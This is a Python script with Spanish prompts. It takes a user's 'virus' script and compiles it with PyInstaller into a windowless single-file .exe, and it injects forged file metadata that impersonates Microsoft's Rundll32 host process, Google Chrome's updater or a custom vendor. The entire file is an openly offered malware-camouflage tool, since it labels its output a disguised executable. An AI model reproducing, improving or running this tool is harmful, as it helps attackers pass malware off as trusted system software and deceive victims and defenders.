import os
import sys
import subprocess

def inyectar_metadatos_y_compilar():
    print("=======================================================")
    print("   FALSIFICADOR DE PROPIEDADES Y COMPILADOR DIRECTO    ")
    print("=======================================================\n")
    
    script_objetivo = input("Introduce el nombre de tu virus (.py): ").strip()
    if not os.path.exists(script_objetivo):
        print(f"[ERROR] El script '{script_objetivo}' no existe.")
        return

    print("\nSelecciona una plantilla de camuflaje empresarial:")
    print(" [0] Microsoft Corporation (Componente de Sistema)")
    print(" [1] Google LLC (Actualizador de Google Chrome)")
    print(" [2] Personalizado (Escribir tus propios datos)")
    
    opcion = input("\nIntroduce tu opción: ").strip()
    
    if opcion == "0":
        empresa, descripcion, producto, copyright_txt = "Microsoft Corporation", "Windows Host Process (Rundll32)", "Microsoft® Windows® Operating System", "© Microsoft Corporation. All rights reserved."
    elif opcion == "1":
        empresa, descripcion, producto, copyright_txt = "Google LLC", "Google Update Core", "Google Chrome", "Copyright 2026 Google LLC. All rights reserved."
    else:
        empresa = input("Nombre de la Empresa: ")
        descripcion = input("Descripción del archivo: ")
        producto = input("Nombre del Producto: ")
        copyright_txt = input("Texto de Copyright: ")

    os.makedirs("metadata_out", exist_ok=True)
    ruta_txt = os.path.join("metadata_out", "version_info.txt")

    contenido_version = f'''
VSVersionInfo(
  ffi=FixedFileInfo(fileflags=0x0, fileos=0x40004, filetype=0x1, subtype=0x0, date=(0, 0)),
  kids=[
    StringFileInfo([
      StringTable(
        '040904B0',
        [StringStruct('CompanyName', '{empresa}'),
        StringStruct('FileDescription', '{descripcion}'),
        StringStruct('FileVersion', '1.0.0.0'),
        StringStruct('InternalName', 'sys_core'),
        StringStruct('LegalCopyright', '{copyright_txt}'),
        StringStruct('OriginalFilename', 'sys_core.exe'),
        StringStruct('ProductName', '{producto}'),
        StringStruct('ProductVersion', '1.0.0.0')])
      ]), VarFileInfo([VarCodePage(0x0409, 1252)])
  ]
)
'''
    with open(ruta_txt, "w", encoding="utf-8") as f:
        f.write(contenido_version.strip())
        
    nombre_exe = os.path.splitext(os.path.basename(script_objetivo))[0]
    
    print(f"\n[1/2] Asegurando PyInstaller...")
    subprocess.run([sys.executable, "-m", "pip", "install", "pyinstaller"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    # Asociamos el txt de version directamente en el comando de PyInstaller
    comando = ["pyinstaller", "--onefile", "--noconsole", f'--version-file={ruta_txt}', f"--name={nombre_exe}", script_objetivo]
    
    print(f"[2/2] Compilando e inyectando metadatos de {empresa}...")
    proceso = subprocess.run(comando, stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
    
    if proceso.returncode == 0:
        print("\n=======================================================")
        print("          ¡PROCESO FINALIZADO CON ÉXITO!              ")
        print("=======================================================")
        print(f"El .exe camuflado está listo en la carpeta 'dist\\{nombre_exe}.exe'")
    else:
        print("\n[ERROR] Falló la compilación de recursos.")
    input("\nPresiona Enter para cerrar...")

if __name__ == "__main__":
    inyectar_metadatos_y_compilar()
